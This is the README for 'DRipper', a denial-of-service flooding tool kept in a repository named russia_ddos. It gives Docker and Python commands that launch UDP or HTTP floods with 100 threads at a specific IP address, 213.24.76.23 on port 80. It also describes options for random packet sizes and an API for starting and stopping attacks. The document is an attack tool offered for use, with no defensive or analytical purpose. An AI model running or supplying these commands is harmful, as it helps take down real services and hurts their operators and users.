## Description

This is an optimized version of DRipper. Here is original code: https://gist.github.com/scamp/33807688d0ebdcfbd4c29a4b992a8b54, you can see there a lot of cons like extra requests to Facebook and validator.w3.com, trying establishing connection with attacked resource (but there is no need in it if you want to send a UDP packet). Also the old version is inefficient: you need run several processes to have your processor busy.


## Usage
1. Docker

```bash
docker run -ti --rm alexmon1989/dripper:latest -s 213.24.76.23 -p 80 -t 100
```

2. Directly with Python.

Ensure you have Python 3 installed. Then clone this repo and run main.py with params you need:

-s - IP;

-p - port (default - random from (22, 53, 80, 443) for every packet sending);

-t - threads count. The most important setting. Try to keep the processor busy up to 100%.

-m - attack method: udp (default), http

-r - send packets with random length (up to 50 Kb, works only with UDP attack method)

--resources - name of the resource under attack

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# run
python -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
# OR
python3 -u DRipper.py -s 213.24.76.23 -p 80 -t 100 -r 1 -m udp
```


## API

API is a more convenient wrapper over start, stop, list processed for Dripper.py

```
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# run
pip install requirements.txt
# or
pip3 install requirements.txt

python api.py
# or
python3 api.py
```

Swagger documentation is under 

```
http://localhost:49155/docs
```